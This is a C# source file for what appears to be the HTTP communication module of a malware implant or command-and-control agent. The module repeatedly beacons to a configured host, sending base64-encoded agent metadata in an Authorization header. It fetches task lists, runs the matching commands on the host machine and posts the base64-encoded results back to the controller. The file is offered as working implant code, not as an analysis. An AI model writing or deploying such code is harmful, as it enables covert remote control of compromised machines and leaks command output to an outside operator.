using Implant.Models;
using System;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Implant.Commands;
using System.Collections.Generic;
using Implant.Services;
using System.Linq;

namespace Implant.CommunicationModule
{
    public class HttpCommunicationModule : CommunactionModule
    {

        private static readonly HttpClient client = new HttpClient();
        public override string BindHost => Config.BindHost;

        public override string BindPort => Config.BindPort;

        public override string Type => "HTTP";

        private CancellationTokenSource _tokenSource;

        private string Command;

        public override async Task SendRequest(AgentMetadata agentMetadata)
        {
            await Start(agentMetadata);
        }

        private async Task<AgentTaskResult> CheckCommands(string agentTask, AgentMetadata agentMetadata)
        {

            byte[] jsonBytes = System.Text.Encoding.UTF8.GetBytes(agentTask);
            AgentTask[] agentTasks = jsonBytes.Deserialize<AgentTask[]>();

            List<Command> commands = CommandsList.GetCommands();

            foreach (var task in agentTasks)
            {

                var command = commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));
                if (command is null)
                {

                    return new AgentTaskResult
                    {
                        Result = "Command not found",
                        AgentId = task.AgentId,
                        TaskId = task.Id
                    };
                }
                if (task.Command == "disconnect")
                {
                    Stop();
                }
                try
                {
                    var result = command.Execute(task.Id, task.AgentId, task.Arguments);
                    return result;
                }
                catch (Exception e)
                {
                    return new AgentTaskResult
                    {
                        Result = e.ToString(),
                        AgentId = task.AgentId,
                        TaskId = task.Id
                    };
                }
            }

            return null;
            
        }
        private async Task Start(AgentMetadata agentMetadata)
        {
            _tokenSource = new CancellationTokenSource();
            while (!_tokenSource.IsCancellationRequested)
            {
                var result = await SendMetadata(agentMetadata, HttpMethod.Get);
                if(result == "[]")
                {
                    continue;
                }
                var agentTaskResult = await CheckCommands(result, agentMetadata);
                await SendTaskResult(agentTaskResult, agentMetadata);
            }
        }

        private async Task Stop()
        {
             _tokenSource.Cancel();
        }

        private async Task<string> SendMetadata(AgentMetadata metadata, HttpMethod method)
        {

            var base64String = Convert.ToBase64String(metadata.Serialise());

            var httpRequestMessage = new HttpRequestMessage
            {
                Method = method,
                RequestUri = new Uri($"http://{BindHost}:{BindPort}"),
                Headers = {
                        { HttpRequestHeader.Authorization.ToString(), $"Bearer {base64String}" },
                        { HttpRequestHeader.Accept.ToString(), "application/json" },
                        { "X-Version", "1" }
                },
            };


            var response = client.SendAsync(httpRequestMessage).Result;
            var result = await response.Content.ReadAsStringAsync();
            return result;
        }
		private async Task SendTaskResult(AgentTaskResult taskResult, AgentMetadata agentMetadata)
		{

			string base64String = Convert.ToBase64String(agentMetadata.Serialise());

			string agentTaskResult = Convert.ToBase64String(taskResult.Serialise());

			var parameters = new Dictionary<string, string>
			{
				{ "data", agentTaskResult } // Замените на свои параметры и значения
            };

			var base64Param = new FormUrlEncodedContent(parameters);

			var httpRequestMessage = new HttpRequestMessage
			{
				Method = HttpMethod.Post,
				RequestUri = new Uri($"http://{BindHost}:{BindPort}"),
				Headers = {
						{ HttpRequestHeader.Authorization.ToString(), $"Bearer {base64String}" },
						{ HttpRequestHeader.Accept.ToString(), "application/json" },
						{ "X-Version", "1" }
				},
				Content = base64Param
			};

			var response = client.SendAsync(httpRequestMessage).Result;
		}
	}
}
